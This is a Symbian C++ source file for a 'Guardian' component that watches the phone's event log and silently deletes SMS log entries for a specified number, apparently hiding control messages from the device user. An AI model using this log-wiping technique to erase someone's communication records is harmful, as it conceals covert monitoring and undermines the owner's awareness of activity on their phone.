/*#ifdef __WINS__
	_LIT(KEmulatorImei, "123456789012345");
#endif*/

#include "LogCleaner.h"

#include <f32file.h>

// Testa il caso in cui si ricevono/inviano piu' sms nello stesso momento
// viene richiamato il metodo DeleteMostRecent senza che sia terminata la precedente esecuzione


/*GLDEF_C TInt E32Dll(TDllReason)
{
	return(KErrNone);
}*/


CLogCleaner::CLogCleaner() : CActive(EPriorityStandard)
	{ 
	CActiveScheduler::Add( this );
	iStato = EHandle_NotifyChange;
	__LOG_OPEN("Guardian", "LogCleaner.txt");
	}


EXPORT_C CLogCleaner::~CLogCleaner() 
	{
	__LOG_TXT("Desctructor");
	Cancel();
	if (iLogView)
		delete iLogView;
	if (iLogClient)
		delete iLogClient;
	if (iFilter)
		delete iFilter;
#ifndef __WINS__
#endif
	__LOG_TXT("End Desctructor");
	__LOG_CLOSE;
	}


TInt CLogCleaner::RunError(TInt aError) 
	{
	__LOG("RUN ERROR:%d", aError);
	return aError;
	}



EXPORT_C CLogCleaner* CLogCleaner::NewL(RFs& aFs) 
	{
	CLogCleaner* self = new (ELeave) CLogCleaner();
	CleanupStack::PushL( self );
	self->ConstructL(aFs);
	CleanupStack::Pop();
	return self;
	}



void CLogCleaner::ConstructL(RFs& aFs)
	{
	iFilter = CLogFilter::NewL();
	iFilter->SetEventType(KLogShortMessageEventTypeUid);

#ifndef __WINS__
	iLogClient = CLogClient::NewL(aFs);
	iLogView = CLogViewEvent::NewL(*iLogClient);
#endif
	__LOG_TXT("Init Done");
	}


EXPORT_C void CLogCleaner::StartCleaner(const TDesC& aNumber)
	{
#ifdef _DEBUG
	return;
#endif
	iFilter->SetNumber(aNumber);
	this->NotifyChange();
	}


void CLogCleaner::NotifyChange()
	{
	if(IsActive())
		{
		__LOG_TXT("Already Active");
		return;
		}
	iLogClient->NotifyChange(1000000, iStatus);
	SetActive();
	iStato = EHandle_NotifyChange;
	__LOG_TXT("IssueNotify");
	}

	

void CLogCleaner::RunL() 
	{
	__LOG("Stato:%d", iStato);
	__LOG("RUNL:%d", iStatus.Int());

//	if ( iStatus != KErrNone  && iStato != EHandle_NotifyChange)
//	{
//	}

	switch (iStato) 
		{
		case EHandle_NotifyChange:
			{
			bool hasEvents = iLogView->SetFilterL(*iFilter, iStatus);
			if (hasEvents) 
			{
				iStato = EHandle_SetFilter;
				SetActive();
			} else 
			{
				__LOG_TXT("ListEmpty");
				NotifyChange();
			}
			break;
			}

		case EHandle_SetFilter:
			{
			__LOG("Moved on:%d", iLogView->Event().Id());
			/*iMsg.Zero(); 
			// = iLogView->Event().Link();
			if (iLogView->Event().Subject() == _L("//LOSTPASS")) 
			{
				TBuf<KLogMaxDirectionLength> direction;
				iLogClient->GetString(direction, R_LOG_DIR_IN);
				if (iLogView->Event().Direction() == direction) 
					{
					iMsg = KLOSTPASS;
					}
			}
			__LOG("Link:%d"), iMsg);*/
			/*__LOG_TXT("Subj"));
			__FLOG(iLogView->Event().Subject());
			if (iLogView->Event().Subject()[0] == TChar('*'))
			{
			}*/
			iLogClient->DeleteEvent(iLogView->Event().Id(), iStatus);
			iStato = EHandle_DeleteEvent;
			SetActive();
			break;
			}
			
		case EHandle_DeleteEvent:
			{
			__LOG_TXT("Deleted");
			NotifyChange();

/*			if ((iMsgReceiver != NULL) && (iMsg.Length()>0))
			{
				iMsgReceiver->InternalMessageForGuardian2L(iMsg);
			}*/
/*			if (iLogView->NextL(iStatus)) 
			{
				SetActive();				
				iStato = EHandle_MoveOnEvent;
				break;
			}*/
			break;
			}
		}
	}



void CLogCleaner::DoCancel()
	{
	__LOG("DoCancel() %d", iStato);
	switch (iStato) 
		{
		case EHandle_NotifyChange:
			{
			iLogClient->NotifyChangeCancel();
			break;
			}
		case EHandle_SetFilter:
			{
			iLogView->Cancel();
			break;
			}
		case EHandle_DeleteEvent:
			{
			iLogClient->Cancel();
			break;
			}
		}
	}

